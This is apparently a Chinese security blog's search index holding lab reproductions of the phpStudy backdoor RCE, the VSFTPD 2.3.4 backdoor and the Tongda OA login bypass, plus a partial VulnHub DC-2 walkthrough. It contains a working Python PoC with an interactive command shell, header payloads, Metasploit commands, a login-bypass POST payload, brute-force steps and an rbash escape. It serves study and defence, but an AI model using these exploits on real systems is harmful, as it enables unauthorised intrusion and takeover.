<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>phpstudy_2016-2018_rce 漏洞复现</title>
      <link href="/2023/09/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpstudy_2016-2018_rce%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/09/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpstudy_2016-2018_rce%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>攻击者可以利用该漏洞执行PHP 命令，也可以称作 phpStudy 后门 。RCE(Remote Command|Code Execute)</p><p>Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin等多款软件一次性安装，无需配置即可直接安装使用，一键搭建。 <strong>其中2016、2018版本的phpstudy存在被黑客恶意篡改后形成的RCE漏洞</strong>。该漏洞可以直接远程执行系统命令。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p> phpStudy 2016和2018两个版本</p><p>后门代码存在于\ext\php_xmlrpc.dll模块中</p><ul><li><p>phpStudy2016 查看</p><ul><li>\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</li><li>\phpStudy\php\php-5.4.45\ext\php_xmlrpc.dll</li></ul></li><li><p>phpStudy2018查看</p><ul><li>\phpStudy\PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</li><li>\phpStudy\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll</li></ul></li></ul><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><strong>网上某位大佬的</strong></p><p>通过 IDA分析xmlrpc.dll发现，被植入危险函数eval()。</p><p><img src="image-20230921200943042.png" alt="image-20230921200943042"></p><p>xmlrpc.dll中的初始化函数request_startup_func被篡改:当发起HTTP请求的数据包中包含“Accept-Encoding”字段时，就会进入黑客自定义的攻击流程。</p><p><img src="202309212007254.png" alt="image-20230921200755191"></p><p>当Accept-Encoding字段的信息为“compress,gzip”时，触发系统收集功能。</p><p><img src="image-20230921201052984.png" alt="image-20230921201052984"></p><p>当Accept-Encoding字段的信息为“gzip,deflate”时，再进一步判断Accept-Charset字段，只有当Accept-Charset字段为一些特定字符时才会触发漏洞。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>安装phpstudy2016或者phpstudy2018，<strong>需要把PHP版本换成5.2.17或5.4.45版本</strong></p><p><img src="image-20230921201305067.png" alt="image-20230921201305067"></p><h3 id="查看是否漏洞验证"><a href="#查看是否漏洞验证" class="headerlink" title="查看是否漏洞验证"></a>查看是否漏洞验证</h3><ul><li><ul><li>\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll</li><li>\phpStudy\php\php-5.4.45\ext\php_xmlrpc.dll</li></ul></li><li>phpStudy2018查看<ul><li>\phpStudy\PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</li><li>\phpStudy\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll</li></ul></li></ul><p>打开你phpstudy对应的文件查找@eval，文件存在@eval(%s(‘%s’))证明漏洞存在</p><p><img src="image-20230921203944821.png" alt="image-20230921203944821"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="code1：手工利用"><a href="#code1：手工利用" class="headerlink" title="code1：手工利用"></a>code1：手工利用</h3><p>使用burp抓包</p><p>添加请求头<code>Accept-Charset</code>值是想要执行的php代码<code>system(&#39;whoami&#39;);</code>代码需要进行base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=</span><br></pre></td></tr></table></figure><p>需要将<code>Accept-Encoding: gzip, deflate</code>修改为<code>Accept-Encoding: gzip,deflate</code>就是把中间的空格删掉<strong>（具体原因可以看上面大佬的漏洞分析）</strong></p><p><img src="image-20230921202047650.png" alt="image-20230921202047650"></p><p>重放请求包</p><p><img src="image-20230921202153040.png" alt="image-20230921202153040"></p><h3 id="code2：POC脚本"><a href="#code2：POC脚本" class="headerlink" title="code2：POC脚本"></a>code2：POC脚本</h3><p><strong>来源于GitHub</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># phpStudy_2016-2018_RCE_POC.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment">#向目标提交请求，漏洞触发。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rce</span>(<span class="params">url,cmd</span>):</span><br><span class="line">    cmd = base64.b64encode(<span class="string">&quot;system(&#x27;&#123;&#125;&#x27;);&quot;</span>.<span class="built_in">format</span>(cmd).encode()).decode()</span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Accept-Charset&#x27;</span>: cmd,<span class="comment">#请求头中提交参数，触发漏洞。</span></span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate&#x27;</span>,<span class="comment">#请求头中提交参数，触发漏洞。</span></span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 OPR/73.0.3856.284&#x27;</span></span><br><span class="line">    &#125; <span class="comment">#浏览器指纹</span></span><br><span class="line">    res = requests.get(url = url ,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(res.status_code)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:        <span class="comment">#判断是否能与目标正常通信</span></span><br><span class="line">        bof = <span class="number">0</span></span><br><span class="line">        eof = res.content.index(<span class="string">b&quot;&lt;!DOCTYPE html&quot;</span>)  <span class="comment">#将回复内容转化为二进制字符</span></span><br><span class="line">        k = (res.content[bof:eof].decode(<span class="string">&quot;gbk&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> k</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="string">&quot;error url!&quot;</span>)</span><br><span class="line"><span class="comment"># 生成随机数与目标返回的字符对比，判断目标是否在线。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>():</span><br><span class="line">    j = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        j +=random.choice(string.digits + string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"><span class="comment">#初始化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url</span>):</span><br><span class="line">    flag1 = judge()</span><br><span class="line">    cmd = <span class="string">&quot;echo &quot;</span> + flag1</span><br><span class="line">    flag2 = rce(url, cmd)</span><br><span class="line">    <span class="keyword">if</span>  flag1 <span class="keyword">in</span> flag2 :</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[+] Target is enable!&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd = <span class="built_in">input</span>(<span class="string">&quot;[*] cmd &gt;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> cmd == <span class="string">&quot;q&quot;</span> <span class="keyword">or</span> cmd == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(rce(url, cmd))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Target is not  enable! exit 3s later&quot;</span>)</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;Enter an url ：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Testing url:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-----------------&#x27;</span>)</span><br><span class="line">    main(url)</span><br></pre></td></tr></table></figure><p><img src="image-20230921202600298.png" alt="image-20230921202600298"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>下载：phpxmlrpc.rar 解压 复制文件</p><ul><li><p>php\php-5.2.17\ext\php_xmlrpc.dll</p></li><li><p>php\php-5.4.45\ext\php_xmlrpc.dll</p></li></ul><p>覆盖原路径文件即可。</p><h2 id="复现环境所需安装包以及工具"><a href="#复现环境所需安装包以及工具" class="headerlink" title="复现环境所需安装包以及工具"></a>复现环境所需安装包以及工具</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1D3UNrg9xUNri8oiVEnsSdw?pwd=uuxq </span><br><span class="line">提取码：uuxq </span><br></pre></td></tr></table></figure><p><img src="image-20230921204741300.png" alt="image-20230921204741300"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VSFTPD 2.3.4 笑脸漏洞</title>
      <link href="/2023/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/VSFTPD%202.3.4%20%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/VSFTPD%202.3.4%20%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>压缩包需要下载特定版本，官方提供的安装包没有这个漏洞</strong></p><p>1.靶机环境是centos7  ，首先解压缩包，并上传到靶机目录</p><p>  tar -zxvf   压缩包名称</p><p>2.进入vsftpd目录，赋予文件权限，之后进行make &amp;&amp;make install</p><p>cd &#x2F;vsftpd-2.3.4</p><p>chmod 777 *</p><p>make &amp;&amp;make install</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="code-1"><a href="#code-1" class="headerlink" title="code:1"></a>code:1</h2><p>使用msf利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor </span><br><span class="line">set RhoSTS 192.168.142.145</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="code-2"><a href="#code-2" class="headerlink" title="code:2"></a>code:2</h2><p>手动利用</p><p>打开命令行登录ftp服务器，在用户名处输入root:)然后随意输入一个密码回车等待，</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309160952000.png" alt="image-20230916095254559"></p><p>输入nc 目标ip 6200 即可连接</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309160953548.png" alt="image-20230916095306663"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA前台任意用户登录漏洞复现</title>
      <link href="/2023/08/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/08/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>通达OA是一套使用比较广泛的办公系统。该漏洞因为使用uid作为身份标识，攻击者在远程且未经授权的情况下，通过利用此漏洞，可以直接绕过登录验证逻辑，伪装为系统管理员身份登录OA系统。通达OA官方于2020年4月17日发布安全更新。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>通达OA &lt; 11.5<br>通达OA 2017版本</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>本次复现为2017版本，则重点分析该版本，但原理都是基本相同的，只不过文件路径不同而已。根据POC的代码分析如下，该漏洞涉及的文件包含以下四个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ispirit/login_code.php</span><br><span class="line">/general/login_code_scan.php</span><br><span class="line">/ispirit/login_code_check.php</span><br><span class="line">/general/index.php</span><br></pre></td></tr></table></figure><p>通达OA源码使用zend5加密 ，分析源码需要先进行解密</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110222.png" alt="image-20230916180222601"></p><p>本事使用的解密工具是:SeayDzend，工具使用很简单</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110140.png" alt="image-20230916181002666"></p><h3 id="ispirit-login-code-php："><a href="#ispirit-login-code-php：" class="headerlink" title="&#x2F;ispirit&#x2F;login_code.php："></a><strong>&#x2F;ispirit&#x2F;login_code.php：</strong></h3><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110548.png" alt="image-20230916181726302"></p><p>该文件用来获取codeuid参数，如果不存在，则会自动生成一个codeuid，并且将其写入CODE_LOGIN_PC缓存中（通达OA使用了缓存系统Redis，同时也提供了对缓存的使用方法），但是在18行位置将这个参数显示出来，导致用户可以获取这个参数的值，从而可以绕过后面的验证。</p><h3 id="general-login-code-scan-php："><a href="#general-login-code-scan-php：" class="headerlink" title="&#x2F;general&#x2F;login_code_scan.php："></a><strong>&#x2F;general&#x2F;login_code_scan.php：</strong></h3><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170109895.png" alt="image-20230916182942854"></p><p>在这一文件中，用户可以控制输入的关键参数uid，在存在漏洞的通达OA版本中，后台数据库里uid对应的用户是admin管理员账户。并且将该数据存储在CODE_INFO_PC缓存中，因为我们在第一个文件中获取的codeuid存储在CODE_LOGIN_PC中，所以这里在复现时需要指明source变量为pc，这里的username则为admin，而type变量需要指明为confirm，原因在后面会进行解释。</p><h3 id="ispirit-login-code-check-php："><a href="#ispirit-login-code-check-php：" class="headerlink" title="&#x2F;ispirit&#x2F;login_code_check.php："></a><strong>&#x2F;ispirit&#x2F;login_code_check.php：</strong></h3><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110012.png" alt="image-20230916182413645"></p><p>这里使用之前存储的两个缓存中的内容，一个用来获取codeuid，一个用来获取通过post传入的uid等关键信息，这里红框就是为什么前一步需要将type设置为confirm。</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110249.png" alt="image-20230916182532863"></p><p>这里是最为关键的位置，代码获取用户可控的参数uid，并依次作为依据直接带入数据库进行查询</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110948.png" alt="image-20230916182612401"></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110857.png" alt="image-20230916182757653"></p><p>随后将查询的信息直接写入session中，通过这一步，session中包含的就是管理员的身份信息。</p><p>以上就是该漏洞的原理，V11版本原理类似，可用对照POC中的步骤进行分析复现。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>通达OA-TDOA11.4_2 建议在虚拟机环境下安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe</span><br></pre></td></tr></table></figure><p>下载下来一路默认下一步就行！</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110446.png" alt="image-20230916184345376"></p><p>安装完成最后需要检测端口</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110742.png" alt="image-20230916184810146"></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110101.png" alt="image-20230916184854995"></p><p>最后点击确定就行</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110356.png" alt="image-20230916185126003"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="code1：手工利用"><a href="#code1：手工利用" class="headerlink" title="code1：手工利用"></a>code1：手工利用</h4><p>按照poc中的步骤，首先抓首页的包进行更改，访问&#x2F;ispirit&#x2F;login_code.php</p><p>通过返回包获取codeuid</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110472.png" alt="image-20230916190258275"></p><p>而后使用POST方式访问&#x2F;general&#x2F;login_code_scan.php提交payload，其中codeuid需要改为上一步中返回的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=1&amp;codeuid=&#123;3CD5FFC0-E64E-6E7E-123F-64A3578FF5A0&#125;&amp;type=confirm&amp;source=pc&amp;username=admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110996.png" alt="image-20230916190353017"></p><p>第三步使用GET方式访问&#x2F;ispirit&#x2F;login_code_check.php，带上参数codeuid，让后台进行代入查询，并返回携带管理员身份信息的凭证。</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110753.png" alt="image-20230916190427180"></p><p>经过这步后客户端已经拥有了管理员的身份信息，直接访问OA主页&#x2F;general&#x2F;index.php，放行该数据包，成功以管理员身份登录OA系统。</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110513.png" alt="image-20230916190511191"></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170110082.png" alt="image-20230916190536836"></p><h4 id="code2：POC利用"><a href="#code2：POC利用" class="headerlink" title="code2：POC利用"></a>code2：POC利用</h4><p><code>python3 .\POC.py -v 2017 -url http://192.168.142.129/</code></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111829.png" alt="image-20230916191545447"></p><p>访问主页<code>http://192.168.142.129/general/index.php</code></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111515.png" alt="image-20230916190714276"></p><p>修改cookie中PHPSESSID的值并刷新页面就会发现登录成功了</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111828.png" alt="image-20230916191720131"></p><p>最后修改cookie也可以在bp里面修改</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111144.png" alt="image-20230916191948049"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>更新最新版本</p><h2 id="复现环境所需安装包以及工具"><a href="#复现环境所需安装包以及工具" class="headerlink" title="复现环境所需安装包以及工具"></a>复现环境所需安装包以及工具</h2><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309170111921.png" alt="image-20230916192513452"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度链接：https://pan.baidu.com/s/1BYpQZ8lqrHGJu1YohSxqQA?pwd=r8g3 </span><br><span class="line">提取码：r8g3 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机 DC-2</title>
      <link href="/2023/08/07/vulnhub%E9%9D%B6%E6%9C%BA/DC2/"/>
      <url>/2023/08/07/vulnhub%E9%9D%B6%E6%9C%BA/DC2/</url>
      
        <content type="html"><![CDATA[<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p>靶机介绍：<a href="https://www.vulnhub.com/entry/dc-2,311/">https : &#x2F;&#x2F;download.vulnhub.com&#x2F;dc&#x2F;DC-2.zip</a></p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172045524.png" alt="在这里插入图片描述">​</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><ol><li>获取IP地址</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">扫描靶机的IP的方法</span><br><span class="line">1. nmap -sP 192.168.142.0/24  #nmap进行ping扫描发现存活主机</span><br><span class="line">2. arp-scan -l   #基于ARP发现内网存活主机</span><br><span class="line">3. netdiscover -r 192.168.142.0/24 -i eth0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参考文章：</span><br><span class="line">nmap思维导图：https://mp.weixin.qq.com/s/42dNv-q7K_XcJ7cv23LNSA</span><br><span class="line">arp-scan：https://blog.csdn.net/qq_41453285/article/details/100942591</span><br><span class="line">          https://www.kali.org/tools/arp-scan/</span><br><span class="line">netdiscover：https://blog.csdn.net/u010698107/article/details/115288643</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172045521.png" alt="image">​</p><ol><li><p>扫描靶机开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用nmap扫描：nmap -A -O -sV -p- 192.168.142.130</span><br><span class="line">使用masscan扫描：masscan -p1-65535,U:1-65535 192.168.142.130 --rate=1000</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan参考文章：https://blog.csdn.net/qq_59923059/article/details/124902967</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172045833.png" alt="image">​</p><p>看到靶机开放了80和7744端口对应的http和ssh服务</p></li><li><p>访问http服务</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172045135.png" alt="image">​</p><p>发现被重定向到 <a href="http://dc-2/">http://dc-2/</a></p></li><li><p>修改hosts文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Win10hosts文件位置：C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">Linux hosts文件位置：/etc/host</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts参考文章：https://www.jianshu.com/p/476a92a39b45</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172045837.png" alt="image">​</p></li><li><p>重新访问http服务，得到flag1</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172045040.png" alt="image">拿到flag1</p><p>得到提示</p><ol><li>这个网站是wordpress搭建的</li><li>需要使用cewl</li><li>登录之后就可以看到下一个flag</li></ol><p>使用网站指纹识别工具whatweb扫描发现确实是WordPress</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Whatweb使用方法 https://cloud.tencent.com/developer/article/1966438?areaSource=&amp;traceId=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046176.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wordpress介绍：</span><br><span class="line">https://zh.wikipedia.org/wiki/WordPress</span><br><span class="line">https://zhuanlan.zhihu.com/p/60461351</span><br><span class="line">https://www.mezgy.com/203.html</span><br></pre></td></tr></table></figure></li><li><p>使用cewl生成密码字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl参考文章：https://www.freebuf.com/articles/network/190128.html</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046876.png" alt="image">​</p></li><li><p>使用wpscan 暴力枚举用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan参考文章：https://www.jianshu.com/p/a0143cc79215</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046291.png" alt="image">​</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046009.png" alt="image">​</p><p>得到了三个用户名分别是admin，jerry，tom</p></li><li><p>使用wpsan爆破wordpress用户名密码</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046466.png" alt="image">​</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046017.png" alt="image">​</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046241.png" alt="image">得到两个用户名密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jerry / adipiscing                                                                                                                                                                </span><br><span class="line">tom / parturient  </span><br></pre></td></tr></table></figure></li><li><p>使用获得的账号密码登录wordpress</p><p>使用jerry &#x2F; adipiscing登录</p><p><img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046259.png" alt="image">​</p><p>得到flag2，提示需要找到另外一个入口</p></li></ol><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><ol start="10"><li><p>使用刚刚获得的账号密码登录ssh</p><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046987.png" alt="image">​</p><p> 登录成功</p></li></ol><h1 id="rbash绕过"><a href="#rbash绕过" class="headerlink" title="rbash绕过"></a>rbash绕过</h1><ol start="11"><li><p>输入命令发现有rbash限制</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rbash绕过方法</span><br><span class="line">https://www.freebuf.com/articles/system/188989.html</span><br><span class="line">https://blog.csdn.net/weixin_43705814/article/details/111879362</span><br><span class="line">http://www.manongjc.com/detail/57-nifycdjdwjjbmqw.html</span><br></pre></td></tr></table></figure><p> 绕过</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a    #把/bin/bash给a变量</span><br><span class="line">export PATH=$PATH:/bin/      #注：将 /bin 作为PATH环境变量导出</span><br><span class="line">export PATH=$PATH:/usr/bin   #注：将 /usr/bin 作为PATH环境变量导出</span><br></pre></td></tr></table></figure></li><li><p>得到flag3</p><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046006.png" alt="image">​</p><p> 提示要切换到jerry</p></li></ol><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ol start="13"><li><p>切换jerry用户</p><p> 查看&#x2F;etc&#x2F;passwd文件看到有jerry用户</p><p> 